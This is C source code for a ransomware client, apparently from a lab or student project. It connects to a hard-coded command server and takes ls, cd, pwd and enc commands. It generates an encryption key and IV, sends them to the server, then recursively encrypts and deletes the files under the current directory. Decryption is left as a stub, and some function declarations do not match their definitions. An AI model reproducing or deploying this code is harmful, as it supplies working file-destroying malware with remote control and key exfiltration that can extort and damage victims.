#include "ransomlib.h"
#include <dirent.h>
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <openssl/rand.h>
#include <stdio.h>
#include <errno.h>

void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
    int sockid;
    int server_port = 8888;
    char *server_ip = "10.0.0.2";

    sockid = socket(AF_INET, SOCK_STREAM,0);
    if (sockid <0)
    {
        printf("Error when creating socket\n");
        abort();
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    struct sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(5555);
    client_addr.sin_addr.s_addr = inet_addr("10.0.0.1");

    if (bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr))<0)
    {
        printf("Error during binding\n");
        printf("%s", strerror(errno));
        abort();
    }
    if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr))!=0)
    {
        printf("Error during connection\n");
        printf("%s", strerror(errno));
        abort();
    }
	
    while(1) 
    {
        int status;
        char command[512];
        status = recv(sockid, command, 512, 0);
        if (status<=0)
        {
            printf("Connection shutdown\n");
            abort();
        }
        

        if(strncmp(command,"ls",2) == 0)   //Handle ls command
        {
            FILE *out_fp;
            char buffer[1048];
            char path[100000];
            int  bytes;

            out_fp = popen("/bin/ls", "r");

            fgets(buffer, sizeof(buffer), out_fp);      //put in path the result of ls command line by line
            strcpy(path, buffer);

            while (fgets(buffer, sizeof(buffer), out_fp) != NULL)
            {
                strcat(path, buffer);
            }
            bytes =send(sockid, (const char *)path, strlen(path),0); //send the whole result once
            
        }
        else if(strncmp(command,"enc",3) ==0)   //Handle enc command
        {
            char cwd[1048];
            getcwd(cwd, 1024);

            unsigned char key[33];
            int sizeKey = 33;
            unsigned char iv[33];
            int sizeIv = 33;
            char pKey[65];
            char pIv[65];
	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);

            send_key(pKey, pIv, sockid, server_addr);

            listdir((const char *)cwd, iv, key, 'e');
            
            char response[2048];
            strcpy(response, cwd);
            strcat(response, " ");
            strcat(response, "Encrypted");


            send(sockid, (const char *)response, strlen(response)+1,0);
            
        }
        else if (strncmp(command, "dec",3)==0)
        {
            unsigned char key[33];
            int sizeKey = 33;
            unsigned char iv[33];
            int sizeIv = 33;
            char pKey[65];
            char pIv[65];
            const char * separator = " ";

            char * strToken = strtok(command, separator);
            strToken = strtok(NULL, separator);
            printf("%s\n", strToken);
            strToken = strtok(NULL, separator);
            printf("%s\n", strToken);
    



        }
        else if (strncmp(command,"pwd",3) ==0)
        {
            char cwd[1048];
            int bytes;
            getcwd(cwd, 1048);
            printf("%s\n", cwd);
            bytes = send(sockid, (const char *)cwd, strlen(cwd)+1,0);
            printf("%d\n", bytes);

        }
        else if(strncmp(command,"cd", 2) ==0)
        {
            char cwd[1048];
            int status;
            int size;
            char *error;
            char buff[1048];
            const char * separator = " ";
            char * strToken = strtok(command, separator); //spliting array in two array in order to get the path
            strToken = strtok(NULL, separator);
            strcpy(buff, strToken);
            size = strlen(buff);
            buff[size-1] ='\0'; //removing \n from the path
            status = chdir(buff);
            if (status !=0 )
            {
                error = strerror(errno);
                send(sockid, (const char *)error, strlen(error)+1,0);
            }
            else 
            {
                getcwd(cwd, 1024);
                send(sockid, (const char *)cwd, strlen(cwd)+1,0);
                
            }
            
        }
        

    }
	
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	RAND_priv_bytes(key, sizeKey);
	RAND_priv_bytes(iv, sizeIv);
	bytes_to_hexa(key, pKey,sizeKey );
	bytes_to_hexa(iv, pIv, sizeKey);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	DIR *dp = opendir(name);
	struct dirent *dirp;

	while((dirp = readdir(dp)) != NULL)
    {
        if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
        {
            
            char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(newPath,name);
            strncat(newPath,"/",2);
            strncat(newPath,dirp->d_name,strlen(dirp->d_name));
            listdir(newPath,iv, key, 'e');
            free(newPath);
        }

        else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
        {
            char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(filePath,name);
            strncat(filePath,"/",2);
            strncat(filePath,dirp->d_name,strlen(dirp->d_name));
            printf("%s\n",filePath);
            if (de_flag == 'e')
            {
                encrypt(key, iv, filePath);
                remove(filePath);
            }
            else 
            {
                decrypt(key, iv, filePath);
                remove(filePath);
            }
            free(filePath);
        }
    }
}


int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
{
    
    char *msg = malloc(strlen(pKey)+strlen(pIv)+2);  // Format du message key:Iv
    strcpy(msg, pKey);
    strcat(msg,":");
    strcat(msg,pIv);
    
    send(sockid, (const char *)msg, strlen(msg)+1,0);
    free(msg);
}
        
